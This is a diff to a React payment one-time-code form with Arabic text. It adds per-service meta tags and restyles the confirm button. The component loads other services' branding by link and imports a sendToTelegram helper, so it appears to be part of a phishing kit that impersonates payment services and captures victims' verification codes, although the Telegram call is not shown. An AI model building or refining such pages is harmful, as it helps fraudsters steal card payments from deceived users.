@@ -4,7 +4,8 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { Shield, AlertCircle, Check } from "lucide-react";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { Shield, AlertCircle, Check, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -152,11 +153,18 @@ const PaymentOTPForm = () => {
   };
   
   return (
-    <div 
-      className="min-h-screen bg-background"
-      dir="rtl"
-    >
-      {/* Hero Section */}
+    <>
+      <PaymentMetaTags 
+        serviceName={serviceName}
+        amount={formattedAmount}
+        title={`رمز التحقق - ${serviceName}`}
+        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
+      />
+      <div 
+        className="min-h-screen bg-background"
+        dir="rtl"
+      >
+        {/* Hero Section */}
       <div className="relative w-full h-48 sm:h-64 overflow-hidden">
         <img 
           src={heroImage}
@@ -291,7 +299,7 @@ const PaymentOTPForm = () => {
               <Button
                 type="submit"
                 size="lg"
-                className="w-full text-base sm:text-xl py-6 sm:py-7 font-bold text-white"
+                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                 disabled={attempts >= 3 || otp.length < 6}
                 style={{
                   background: attempts >= 3 
@@ -303,8 +311,8 @@ const PaymentOTPForm = () => {
                   <span>محظور مؤقتاً</span>
                 ) : (
                   <>
-                    <Check className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
-                    <span>تأكيد الدفع</span>
+                    <span className="ml-2">تأكيد الدفع</span>
+                    <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                   </>
                 )}
               </Button>
@@ -343,7 +351,7 @@ const PaymentOTPForm = () => {
           </Card>
         </div>
       </div>
-    </div>
+    </>
   );
 };
 
